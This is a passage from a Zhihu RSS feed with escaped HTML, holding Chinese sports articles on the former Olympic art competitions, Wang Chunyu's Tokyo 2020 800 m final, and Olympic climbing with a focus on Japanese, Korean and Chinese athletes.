data-original=\"https://pic3.zhimg.com/v2-277013288ed3e3fed98dc50cd88eda8a_r.jpg\"><figcaption>让·雅可比，《角球》</figcaption></figure><p>因为上述种种原因，参加奥运会的艺术家们，与其说是艺术家，不如说是「符合奥运精神的资深艺术爱好者」。毕竟，早年间的奥运会非常强调「奥运精神第一，比赛成绩第二」，职业艺术家多仰赖销售作品为生，而奥运会又不想参赛者和钱挂钩，尤其是不想看到赢了金牌的艺术家作品价格变贵。所以当激进的保守派奥委会主席艾弗里·布伦戴奇上任后，他坚持要维护奥运会的纯洁，并力主将全部艺术赛事一次性开除出了奥运会——即便他自己也曾在1932年参与了奥运文学奖的赛事（并没有获得奖牌）。从那以后，这些艺术赛事就再也没有回归奥运大家庭。</p>\n<p>从1912年到1948年的7届奥运会中，总共有23个国家的艺术家赢得了总计147枚奖牌，其中获奖最少的国家是摩纳哥，1枚铜牌，意大利和法国这两个文化大国在金牌榜和总奖牌榜上均并列第二，分别是5枚金牌和14枚奖牌。最终赢得7届奥运会艺术项目金牌和奖牌最多的并不是如今奥运会的大热门中国、美国和俄罗斯，而是德国，他们总共赢得了7金、7银、9铜，总计23枚奖牌。在最后一届包含艺术奖项的奥运会，1948年伦敦奥运会上，英国版画家约翰·科普利以73岁高龄赢得了版画银牌，成为了奥运史上年龄最大的奖牌获得者。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-faefbcfeffcc484783efc4ba80f547cc_b.jpg\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"850\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-faefbcfeffcc484783efc4ba80f547cc_r.jpg\"><figcaption>蔡国强主持创作的「大脚印」是08奥运开幕式最早敲定下来的方案之一</figcaption></figure><p>奥运艺术赛事虽然就此打住了，却以另一种形式延续了下来，那就是花样翻新的开幕式和闭幕式。单就在北京举办的2008年夏季奥运会的开幕式来说，就是众多资深艺术工作者合力的成果。除了广为人知的总导演张艺谋，副导演张继钢、陈维亚管的是各种繁杂的事情。樊跃、王潮歌的大型空间演出经验丰富，蔡国强（大脚印焰火），陈丹青（滚动画轴），陈岩和韩立勋（美术总设计）、陈其钢（音乐）……等等。</p>\n<p>去年年底我在故宫看了蔡国强的个展「远行与归来」，里面有他以故宫收藏的《冰嬉图》为灵感创作的《银河嬉冰》，他也会继续为2022年冬奥会出工出力。或许咱可以借此想象，如果现在的奥运会还有艺术赛事，艺术家们会带来什么样的作品。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f703869f85101a7c16748dde2876f4f0_b.jpg\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"2520\" class=\"origin_image zh-lightbox-thumb\" width=\"4032\" data-original=\"https://pic1.zhimg.com/v2-f703869f85101a7c16748dde2876f4f0_r.jpg\"><figcaption>蔡国强的《银河嬉冰》</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-4d6f0abd0bf5851033560660f9579bdf_b.jpg\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"342\" class=\"origin_image zh-lightbox-thumb\" width=\"512\" data-original=\"https://pic4.zhimg.com/v2-4d6f0abd0bf5851033560660f9579bdf_r.jpg\"><figcaption>《银河嬉冰》局部</figcaption></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/weng-xin-79?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">翁昕</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/396372387?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价 2020 东京奥运会田径女子 800 米决赛王春雨创个人最好成绩获第 5 ？","date":"2021-08-05 06:15:55","description":"\n<p>赛后知道一个小细节，更加理解为何昨天王春雨从赛后直到媒体混采区，一直都在抽泣——她说，<b>自己赛前已经偷偷准备好了领奖服。</b></p>\n<p>尽管可能没有多少人（哪怕是自己人），会相信她能最终站台。</p>\n<p>带着眼泪的「个人最佳」和「创造历史」，特别令人动容。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-112a152b20eda49afd123ad3af2db783_720w.jpg?rss\" data-caption=\"2016年里约奥运，王春雨1分59秒93首次晋级奥运半决赛；2020东京奥运会，则再一次提升，跻身决赛并位列第五。图/Lucy Nicholson\" data-size=\"normal\" data-rawwidth=\"2160\" data-rawheight=\"1214\" data-watermark=\"watermark\" data-original-src=\"v2-112a152b20eda49afd123ad3af2db783\" data-watermark-src=\"v2-4956b549d15c880d2c1fdd08ad69dd77\" data-private-watermark-src=\"v2-c7474485f2d709ef6fb9468940bd0805\"></p>\n<p><br></p>\n<p>女子800米决赛的八名选手在昨天都是超水准的发挥，6人创造了PB（个人最佳）、1人创造了SB（赛季最佳）。包括冠军是美国新国家纪录（1分55秒21）、亚军是英国国家纪录（1分55秒88）。</p>\n<p><b>在这样一场几乎所有选手都拿出自己110%实力的「PB决战」中，王春雨的1分57秒00、第五名的成绩，含金量极高极高。</b></p>\n<p>对她个人来说，也是继半决赛后三天时间再次大幅PB，很厉害。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-caf7708210c60d1c1687b047e25ddb5f_720w.jpg?rss\" data-caption=\"NR是国家纪录，PB是个人最好成绩，SB是该选手本赛季最好成绩\" data-size=\"normal\" data-rawwidth=\"1748\" data-rawheight=\"630\" data-watermark=\"watermark\" data-original-src=\"v2-caf7708210c60d1c1687b047e25ddb5f\" data-watermark-src=\"v2-1631582542cd69aa97afbddacfa1317c\" data-private-watermark-src=\"v2-386ec9984fe4cf0526965c30d6b5df70\"></p>\n<p><br></p>\n<p>赛后王春雨说了一番话，</p>\n<p>“（第五）证明了自己是可以的，但还是遗憾没能站上领奖台。也许是自己水平不够，跟她们还有差距。”</p>\n<p>“<b>这个差距是可以训练出来的，我觉得自己有一天会战胜她们。</b>”</p>\n<hr>\n<p>复盘一下王春雨的东京奥运会之旅。</p>\n<p><br></p>\n<h3>7月30日第一轮，2分00秒05，小组第三晋级半决赛</h3>\n<p>王春雨东京奥运会前表现出的状态非常好，赛前20天曾在杭州跑过一场邀请赛，轻松跑出1分59秒18——<b>这是自1997年上海八运会以来、中国女子800米的最好成绩。</b></p>\n<p>这场比赛对王春雨来说只是奥运前的最后热身赛，并不算完全展现实力，也可见王春雨当下的状态和能力。</p>\n<p>东京的第一轮和半决赛只相隔一天，王春雨也尽量会以最低的消耗确保自己晋级、并在半决赛发挥。最终2分00秒05，小组第三，顺利晋级半决赛。</p>\n<p><br></p>\n<p>5年前的里约，王春雨已经晋级过奥运半决赛，当时她的实力和目标就是半决赛，第一轮就得全力输出（1分59秒93），到了半决赛位列小组第八（2分04秒05）。东京奥运会王春雨不管能力和目标显然都要远得多。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-91a07c34349015a138ad9285d8497c65_720w.jpg?rss\" data-caption=\"里约时，王春雨力拼进入半决赛，第一轮已经全力输出，最终半决赛2分04秒05小组第八\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"349\" data-watermark=\"watermark\" data-original-src=\"v2-91a07c34349015a138ad9285d8497c65\" data-watermark-src=\"v2-147bc558c219281709e80bfade701efd\" data-private-watermark-src=\"v2-ec7cccb094bbd797ae8ec4244083b753\"></p>\n<p><br></p>\n<h3>7月31日半决赛，1分59秒14，小组第二晋级决赛</h3>\n<p>前400米59秒5（第一）、后400米59秒6（最终小组第二），1分59秒14小幅刷新个人PB，小组仅落后基利·霍奇金森0.02秒（基利最终决赛拿了银牌）。</p>\n<p>顺利进入决赛。</p>\n<p><b>首位进入奥运会女子800米决赛的中国运动员，第二位进入决赛的亚洲选手——这个第二让整个亚洲等了近百年，上一次要追溯到1928年阿姆斯特丹奥运会的人见绢枝</b>（当时21岁的日本人人见绢枝拿了银牌，可惜她因为肺结核24岁就去世了）。</p>\n<p>后面是三天后的决赛。</p>\n<p><br></p>\n<h3>8月3日决赛，1分57秒00，第五</h3>\n<p>决赛对王春雨就是拼。这种拼甚至还有破釜沉舟的意味在里面，包括她不断给自己一些暗示，剑指名次、冲击领奖台——这也是很多人（包括我们自己人）兴许都并没有对王春雨报以如此高的期望，王春雨自己却有更高的要求。</p>\n<p><br></p>\n<p>一个细节，完成半决赛后王春雨还和记者开玩笑说，“下一场（决赛）我走完两圈也是第八了，<b>但我觉得我不可能是第八，我想拼一个更好的名次。</b>”</p>\n<p>最后看，这种高要求没有变为负担，相反成了很强的驱动力。</p>\n<p>特别棒。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-daf4159d3d5b7eb309f15164eca6983b_720w.jpg?rss\" data-caption=\"东京奥运会中国不少女选手都有自己的幸运小细节，比如杨倩的小黄鸭头饰、美甲，比如鲍珊菊/钟天使的毛主席佩章等，王春雨的幸运符就是红色蝴蝶结。\" data-size=\"normal\" data-rawwidth=\"2170\" data-rawheight=\"3000\" data-watermark=\"watermark\" data-original-src=\"v2-daf4159d3d5b7eb309f15164eca6983b\" data-watermark-src=\"v2-1293107dfbeaf2318a16ea47af1ab424\" data-private-watermark-src=\"v2-d611ed594dab7610a9c0ce8ef42585bd\"></p>\n<p><br></p>\n<p>解读一下决赛：</p>\n<p><br></p>\n<p>决赛王春雨第二道出发；</p>\n<p>800米内道选手，如果想争夺名次的话，并道后需要特别留意不能被外道选手给卡在里面，这样后面的突围和冲刺很容易失去自己的节奏。王春雨也是很担心这一点，所以并道后，她是想跟住美国人穆的（后来的冠军，1分55秒21）。不过并没能跟到穆后面；</p>\n<p>——看过比赛的应该会有印象，外圈选手并道的瞬间是很“凶”的，并道也是特别的决绝；</p>\n<p>此后王春雨的位置一直在3-5名间左右，<b>比赛前400米58秒2、排名第四</b>；</p>\n<p>比赛后半程看的很振奋。<b>王春雨中后段（大约600米处）有落到后面，一度让人觉得是不是就此会被落下</b>；</p>\n<p>然后她还是咬牙跟住了；</p>\n<p><b>迎来最后100米直道冲刺时，她的排名回到第六、在内道的位置。最后90米，王春雨突然很坚决的选择往外跑，转到了第三道开始最后冲刺</b>；</p>\n<p>后半程的落后，也是王春雨与穆、基利等选手实力差距的呈现。但王春雨丝毫没有稳妥完赛的意思，真的是毫无保留的拼了最后这段；</p>\n<p>美国的天才少女、19岁的穆最后和别人的差距越拉越大如愿第一个冲线。当时转播画面里王春雨也是大跨步的在冲，完全没有松懈；</p>\n<p>最后第五名完赛，落后铜牌罗杰斯0.18秒、第四简玛·里基0.1秒，其实互相之间的差距并不大。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-b605f4ddb69994aa8a4c588d4ae417e8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2824\" data-rawheight=\"1796\" data-watermark=\"watermark\" data-original-src=\"v2-b605f4ddb69994aa8a4c588d4ae417e8\" data-watermark-src=\"v2-5dac5fc7d14ae975750ce64bd49e6d15\" data-private-watermark-src=\"v2-13249668e591f538b21400f4a57b3a42\"></p>\n<p><br></p>\n<p><b>1分57秒00，比自己三天前跑出的个人PB提升了整整2.14秒</b>，这显然是很超神的表现了——主观来讲，这种超神表现给予的震撼丝毫不亚于苏炳添前几天的9秒83。</p>\n<p>甚至于，可能是赛后到写这个回答、刚刚重新看遍比赛，以及王春雨自己的赛后复盘，还产生更多“好可惜啊”的感觉……</p>\n<p><br></p>\n<p>决赛的八位选手发挥真的都很出色，互相之间的竞争角逐也让每个人都跑出了很快的成绩。“其他人表现一般，王春雨这个发挥是否就拿牌了？”的假设客观来说，本质并不成立。</p>\n<p>这点要承认。</p>\n<p>也无法去奢求或者假象，如果王春雨跑得更快一些会怎样。这个26岁安徽姑娘，已经完全输出了自己的能力。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f3d373ba77d7bf67268d5e24a1c2efd0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5000\" data-rawheight=\"3333\" data-watermark=\"watermark\" data-original-src=\"v2-f3d373ba77d7bf67268d5e24a1c2efd0\" data-watermark-src=\"v2-5d5fa3872bea66d5b87f43e28501ddb8\" data-private-watermark-src=\"v2-1a2740533e0ce38823d5926f47c21c49\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-112a152b20eda49afd123ad3af2db783_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2160\" data-rawheight=\"1214\" data-watermark=\"watermark\" data-original-src=\"v2-112a152b20eda49afd123ad3af2db783\" data-watermark-src=\"v2-4956b549d15c880d2c1fdd08ad69dd77\" data-private-watermark-src=\"v2-c7474485f2d709ef6fb9468940bd0805\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3df88e9dbadcf260482f6ccfd24c35e4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-3df88e9dbadcf260482f6ccfd24c35e4\" data-watermark-src=\"v2-e51fb00d57685dac7da7a313053d7db1\" data-private-watermark-src=\"v2-135681aaaa064958b3b3ac7e1f0f0682\"></p>\n<p><br></p>\n<p>王春雨亚锦赛、亚运会都已拿到过第一名，两届奥运会，里约和东京也已经最好的证明了自己的实力。</p>\n<p>三年后的巴黎奥运会，很难想象王春雨还会站上决赛。不过对东京赛后王春雨的这句话，还是坚信不疑——</p>\n<p>“<b>这个差距是可以训练出来的，我觉得自己有一天会战胜她们。</b>”</p>\n<p><br></p>\n<p>不光你觉得，我们也这样觉得。一定会的。</p>\n<p>兴许明年的杭州亚运会，王春雨依然会（在成绩上）更进一步。</p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476493978/answer/2032949449\" class=\"internal\">2020 东京奥运跳水女子 3 米跳板决赛施廷懋、王涵包揽冠亚军，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476149568/answer/2029677017\" class=\"internal\">2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477063063/answer/2039110968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">125 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/477050158?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价东京奥运会王春雨在800米决赛中的表现？</a><br><a href=\"http://www.zhihu.com/question/476608971?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价中国羽毛球队在东京奥运会上的比赛成绩？</a><br>\n","link":"http://www.zhihu.com/question/477063063/answer/2039110968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价街舞（breaking）、滑板、攀岩和冲浪正式成为 2024 年巴黎奥运会比赛正式项目?","date":"2021-08-05 06:15:47","description":"\n<p>东京奥运会攀岩预赛结束更新：</p>\n<p>中日韩三国赛果如下：</p>\n<p>男子组：中国的小将潘愚非速度赛排名第20位，抱石赛排名第8位，难度攀登比赛排名第7位，最终总成绩第14位，无缘决赛；</p>\n<p>日本队，一哥Tomoa Narasaki发挥出色，不专攻速度赛的他爬出了5.94秒位居第2，抱石赛也高居第2，在基本已经确保晋级的情况下难度攀登轻松上阵排名第14，总成绩第2位进入决赛。另一名选手Kai Harada总成绩排名第18位，无缘决赛；</p>\n<p>韩国队唯一的入围选手Jongwon Chon排名第十与决赛失之交臂。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-86204dbc607449903f154aee883cf4a6_720w.jpg?rss\" data-caption=\"中国选手潘愚非在抱石比赛中，转自国际奥委会官方微博\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1349\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>女子组：专攻速度的中国小将宋懿龄速度赛爬出了6.46秒的好成绩，位居第3位，但是受到肩伤影响的她抱石赛排名第19位，难度攀登比赛排名第18位，最终总成绩第12位无缘决赛；</p>\n<p>日本队，老将Akiyo Noguchi和中生代选手Miho Nonaka分别以总成绩第4位和第3位晋级，毫无悬念；</p>\n<p>韩国队的天才少女Chae-hyun Seo在速度赛仅仅爬出第17名的情况下，抱石赛取得第5名，难度攀登更是豪取第1名，以总成绩第2名的成绩挺进决赛。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-acd6f6881d2abd2e952bf049c4afe3b1_720w.jpg?rss\" data-caption=\"中国选手宋懿龄在速度比赛中，转自国际奥委会官方微博\" data-size=\"normal\" data-rawwidth=\"1514\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>资格赛，中日韩三方的表现基本在笔者的预测范围内。中国两位小将其实需要发挥出自己的全部实力，加上一些些运气才可以晋级。只不过，潘愚非的速度赛稍微欠缺了一些运气，宋懿龄受到奥运会资格赛期间肩伤的影响并没有完全恢复，在战略性放弃抱石赛保存体力避免受伤的情况下难度攀登还是未能克服伤病影响。但是这一次他们的表现已经足够出色，中国的攀岩水平还在不断上升，让我们期待2024年巴黎奥运会速度攀岩和其他两项分开之后，这两位选手和其他中国选手的表现。</p>\n<p>这次奥运会，大家都是时隔很久看到大多数选手登场，所以也是对他们闭关修炼的一个检验。很明显日本队对于速度攀岩的训练得到了回报，潘愚非和韩国的小将Chae-hyun Seo也加强巩固了自己的抱石水平。</p>\n<p>今明天将是男子组和女子组的决赛，祝大家观赛愉快，享受比赛。</p>\n<hr>\n<p>攀岩项目首次进入了奥运，一众岩友的很多回答已经说到了攀岩的方方面面。攀岩首次入奥，中国国家队也是首次建立了一支优秀的攀岩队伍。这支国家队新队伍的诞生引起了我的关注。</p>\n<p>我就稍微聊聊选手，特别是着重聊一下中日韩三国的选手吧。</p>\n<p>中日韩三国在体坛也算相爱相杀多年，并且横跨多个体育项目，足球，篮球，排球，乒乓球，游泳，围棋，并且出现了很多个口口相传的动人故事。现在运动攀岩也进入了奥运大家庭，也算是为这三个国家之前的体育项目比拼又增添的新的一笔。</p>\n<p>笔者个人认为，在现在的攀岩大环境下，中日韩三国之间的关系跟早年的围棋大环境有相似之处：日本实力统治，韩国正在悄悄开始新时代，而中国目前无疑是三个国家中相对较弱的国家，但是前景无疑是光明的…</p>\n<p>先从最强大的日本开始说起。</p>\n<p><b>日本队 </b></p>\n<p><b>关键词：内卷</b></p>\n<p>提起日本队，笔者第一个会想到的是一个最近开始很流行的词语——内卷。</p>\n<p>日本队无疑是全亚洲，乃至于全世界，综合攀岩实力最强的国家。</p>\n<p>日本队有多强？我们用2019年国际攀联世界杯的各个分站赛数据来说话。为什么选用2019年？是因为2019年的时候攀岩在奥运会的比赛方式已经确定（综合），以及各位选手在2019国际攀联世界杯的积分将会被作为奥运资格的选拔方式之一，所以全世界的所有攀岩选手对2019年国际攀联世界杯都非常重视，而且在2019年，在日本的八王子分站赛，第一次出现了按照奥运会标准的综合比赛方式。</p>\n<p>下图是2019年国际攀联世界杯抱石比赛男子组各个分站赛的决赛成员，按照最终名次排列，其中标有绿色的是日本队选手：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0787fa3caba4cc402ecb346ab76c7f9c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"662\" data-rawheight=\"736\" data-watermark=\"watermark\" data-original-src=\"v2-0787fa3caba4cc402ecb346ab76c7f9c\" data-watermark-src=\"v2-63bc8a1d1ce147513cdefda09c428f54\" data-private-watermark-src=\"v2-acf6b6226900ce3763b9067ef1f86e42\"></p>\n<p>可以看到，除了德国慕尼黑站日本队稍显拉垮，没有成员进入前六以外，有两次分站赛有两人进入决赛，有两次分站赛有三人进入决赛，有两次分站赛有四人进入决赛，这个数目放眼任何一个国家都是统治级的。七次有三次冠军落入日本队手中。其中的两次冠军，由目前的日本男子第一人，外号“日本一哥”的Tomoa Nagasaki的获得。</p>\n<p>下图是2019年国际攀联世界杯抱石比赛女子组各个分站赛的决赛成员，按照最终名次排列，其中标有绿色的是日本队选手：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d3bc4372fbb74528aa2106f36879e46a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"736\" data-watermark=\"watermark\" data-original-src=\"v2-d3bc4372fbb74528aa2106f36879e46a\" data-watermark-src=\"v2-8262650633aaacd31ef707da0ba7e08b\" data-private-watermark-src=\"v2-365ae70b09e30b66a2ab560dffa5364c\"></p>\n<p>相比男子组，女子组的统治力也并没有逊色，只是由于2019年是斯洛文尼亚选手Janja Garnbret状态爆炸的一年，日本女队难夺一冠。一直被Janja压制的这位日本选手，正是老来焕发第二春，状态更胜壮年的日本女子第一人，Akiyo Noguchi。</p>\n<p>相比抱石被日本队统治，先锋和速度攀岩相对百花齐放一些。那么，综合这三项考核的攀岩比赛，日本队会不会因此受到影响呢？</p>\n<p>结论是…是的，日本队受到了影响，统治力更加强大了。以下是八王子站综合排名：</p>\n<p>男子组：</p>\n<p>冠军归属日本，前六名四位日本选手。 </p>\n<p><img src=\"https://pic2.zhimg.com/v2-e82d31bb2d8c1d3729336f9a55d3ffed_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1269\" data-rawheight=\"363\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>女子组：</p>\n<p>最好成绩亚军，前六名三位日本选手。 </p>\n<p>所以在攀岩界，有着世界对抗日本的传说…</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8342ad202823b2e9c6e2b927fb85b8a8_720w.jpg?rss\" data-caption=\"网上的调侃世界对抗日本的攀岩表情包\" data-size=\"normal\" data-rawwidth=\"929\" data-rawheight=\"495\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>那么，为什么我要用内卷来形容日本队呢？</p>\n<p>那是因为攀岩奥运名额的问题。由于奥运攀岩比赛的选手人数只有男女各二十人，为了防止一边倒的局面，世界攀联规定，每个国家的名额上限，至多两男两女一共四位选手。</p>\n<p>由于Tomoa和Akiyo在2019年国际攀联世界杯的优异表现，他们各自锁定了一个奥运名额</p>\n<p>由于日本队是东道主，所以还能自动获得一男一女两个名额——事实上，我觉得日本队并不需要东道主这个便利，凭借接下来两位选手（男生Kai Harada和女生Miho Nonaka）的优异表现，也照样能够顺延获得两个奥运名额。</p>\n<p>然而，剩下的一众日本选手，尽管他们的实力可能还强于不少获得奥运资格的其他国家的一些选手，但是因为名额限制，只能遗憾无缘这次奥运。可以说，许多出色的日本攀岩选手们，有着和许多出色的中国乒乓球选手们，有着相似的痛苦。这次疫情之后，日本先于其他国家办起了国内锦标赛，由于比赛荒，日本锦标赛获得了全世界岩友们的空前关注。比赛水平之高，颇有几分我国乒乓球「直通里约热内卢」之类比赛的即视感。</p>\n<p>下面介绍一下一些日本选手：</p>\n<p>奥运选手：Akiyo Noguchi</p>\n<p>这次攀岩入奥，正好赶上了东京奥运会。在当年，得知攀岩有机会加入2020年奥运会之时，当仁不让日本的女子攀岩第一人，Akiyo Noguchi，积极参与了东京申奥的活动。Akiyo其实相对于攀岩选手来说，年纪已经不算轻，她之前也有过2020年之前就退役的打算。但是，在活动中她表示，只要东京获得了2020年奥运会的承办资格，她肯定会积极训练，备战2020东京奥运，在为国效力之后再退役。随着东京申办奥运的成功，Akiyo也实现了自己的梦想。在2018年开始的一系列比赛之中，Akiyo状态爆炸，不仅实现了第二春，并且成绩更胜往昔。早年Akiyo是以柔韧著称，经常出现脚比头高的极限挂脚动作，然而到了职业生涯末期，Akiyo进一步雕琢自己的风格，在动态动作方面取得了长足进步，从动态来说已经是稳稳的世界顶尖水准。然而疫情的降临，让东京奥运推迟至2021年，Akiyo的年龄也来到了31岁，在疫情后的比赛已经出现了明显的状态下滑，不禁让人唏嘘。希望她能够保持状态，能够在奥运比赛中取得理想的成绩。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2004f98c02e63c19d3bb47b02b015893_720w.jpg?rss\" data-caption=\"日本一姐Akiyo Noguchi在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"499\" data-watermark=\"watermark\" data-original-src=\"v2-2004f98c02e63c19d3bb47b02b015893\" data-watermark-src=\"v2-190d0b644211b55f1fa6fa91119df678\" data-private-watermark-src=\"v2-886f72bec4cb1719ef50b87a2e124927\"></p>\n<p>奥运选手：Tomoa Naarasaki</p>\n<p>日本一哥，动态之王，能够跳的时候绝对不静态，已经形成了自己鲜明的风格。其实Tomoa在户外攀岩的时候，其静态动作也是非常精准的，只是在竞技攀岩中，他选择了使用动态方法来完成而已。攀岩的先锋比赛有六分钟的时间限制，但是Tomoa无论能不能把线路爬完，基本上花费的时间都在三分钟以内，人狠话不多。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4d00f33f0012a46c56e20d6c9d2c2424_720w.jpg?rss\" data-caption=\"Tomoa Naarasaki登顶后的标志性动作。图源：Japan Times\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1315\" data-watermark=\"watermark\" data-original-src=\"v2-4d00f33f0012a46c56e20d6c9d2c2424\" data-watermark-src=\"v2-cae801cafd39781888cc01e6bc11ee8e\" data-private-watermark-src=\"v2-c07c7fb8e0a18879f379181427c311ae\"></p>\n<p>奥运选手：Miho Nonaka</p>\n<p>Miho是当仁不让的日本女子攀岩第二人，跟Akiyo颇有一种「既生瑜，何生亮」的味道。除了在2018年世界攀联锦标赛拿了年度世界冠军（Akiyo是年度世界亚军），其余时候基本上是被Akiyo稳压一头（就连2018年也是拿了无数亚军屈居Akiyo之后在某一次比赛绝地翻盘）。坊间传言Miho和Akiyo，以及一些其他日本队成员的关系并没有很好，这点笔者没有特意求证，但是相比于日本队其他选手的其乐融融，Miho颇有种苦大愁深的味道，训练刻苦，甚至还号召日本民众给自己众筹了一个私人的速度攀岩赛道。相比其他选手Miho经常在Instagram发自己的训练视频，并且经常给自己打鸡血，灌鸡汤，不得不让人瑞斯拜。也希望Miho的努力能够取得回报。</p>\n<p><img 